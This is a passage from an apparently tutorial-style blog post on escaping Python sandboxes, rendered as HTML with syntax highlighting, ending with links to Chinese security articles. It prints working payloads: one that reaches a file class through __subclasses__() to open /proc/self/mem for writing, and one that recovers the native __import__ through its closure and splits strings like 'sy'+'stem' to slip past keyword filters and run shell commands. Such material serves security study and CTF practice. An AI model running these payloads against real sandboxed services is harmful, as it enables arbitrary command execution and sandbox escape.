string">'/proc/self/mem'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'/proc/self/mem'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>



</code></pre>
<h3 id="looking-for-an-indirect-reference-to-import"><a aria-hidden="true" class="anchor-heading" href="#looking-for-an-indirect-reference-to-import"><svg aria-hidden="true" viewBox="0 0 16 16"><use xlink:href="#svg-link"></use></svg></a>Looking for an indirect reference to <strong>import</strong></h3>
<p>In the continuous dir process, I found that <strong>closure</strong> this object saves the parameters, you can refer to the native <strong>import</strong></p>
<pre class="language-py"><code class="language-py">


<span class="token keyword">print</span> <span class="token builtin">__import__</span><span class="token punctuation">.</span>__getattribute__<span class="token punctuation">(</span><span class="token string">'__clo'</span><span class="token operator">+</span><span class="token string">'sure__'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cell_contents<span class="token punctuation">(</span><span class="token string">'o'</span><span class="token operator">+</span><span class="token string">'s'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__getattribute__<span class="token punctuation">(</span><span class="token string">'sy'</span><span class="token operator">+</span><span class="token string">'stem'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'l'</span><span class="token operator">+</span><span class="token string">'s home'</span><span class="token punctuation">)</span> 

</code></pre>
<h1 id="参考"><a aria-hidden="true" class="anchor-heading" href="#参考"><svg aria-hidden="true" viewBox="0 0 16 16"><use xlink:href="#svg-link"></use></svg></a>参考</h1>
<p><a href="https://xz.aliyun.com/t/52#toc-10">https://xz.aliyun.com/t/52#toc-10</a> </p>
<p><a href="https://blog.csdn.net/qq_35078631/article/details/78504415">https://blog.csdn.net/qq_35078631/article/details/78504415</a> </p>
<p><a href="https://www.anquanke.com/post/id/85571">https://www.anquanke.com/post/id/85571</a> </p>
<p><a href="http://bestwing.me/2018/05/03/awesome-python-sandbox-in-ciscn/#0x01">http://bestwing.me/2018/05/03/awesome-python-sandbox-in-ciscn/#0x01</a></p>